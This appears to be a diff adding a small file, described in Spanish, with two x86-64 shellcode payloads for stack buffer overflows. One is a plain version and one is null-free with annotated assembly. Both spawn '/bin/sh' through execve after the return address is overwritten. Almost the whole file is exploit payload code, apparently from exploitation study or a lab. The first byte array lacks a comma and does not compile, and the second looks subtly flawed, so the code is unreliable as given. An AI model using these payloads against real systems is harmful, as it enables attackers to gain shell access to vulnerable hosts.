@@ -1,0 +1,30 @@
+Version: shellcode
+Descripción: sobrescribir la dirección de retorno de la pila por la dirección de inicio del payload
+  unsigned char shellcode[] = {
+      0x48, 0x31, 0xc0,
+      0xb0, 0x3b,
+      0x48, 0x31, 0xff
+      0x57,
+      0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
+      0x57,
+      0x48, 0x89, 0xe7,
+      0x48, 0x31, 0xf6,
+      0x48, 0x31, 0xd2,
+      0x0f, 0x05,
+      0x5f
+  };
+
+
+Version: shellcode_noNull
+Descripción: sobrescribir la dirección de retorno de la pila por la instrucción de salto relativo indicando un salto hacia atrás justo al inicio del payload
+  unsigned char shellcode[] =
+    "\x48\x31\xc0"                              // xor    rax, rax
+    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  // mov    rbx, 0x68732f2f6e69622f  -> "/bin//sh"
+    "\x53"                                      // push   rbx
+    "\x48\x89\xe7"                              // mov    rdi, rsp
+    "\x50"                                      // push   rax    ; coloca 0 en la pila (NULL execve : final de argumentos)
+    "\x57"                                      // push   rdi    ; apunta a "/bin//sh"
+    "\x48\x89\xe6"                              // mov    rsi, rsp
+    "\x48\x83\xc0\x3b"                          // add    rax, 0x3b  ; número de syscall para execve
+    "\x0f\x05";
+    
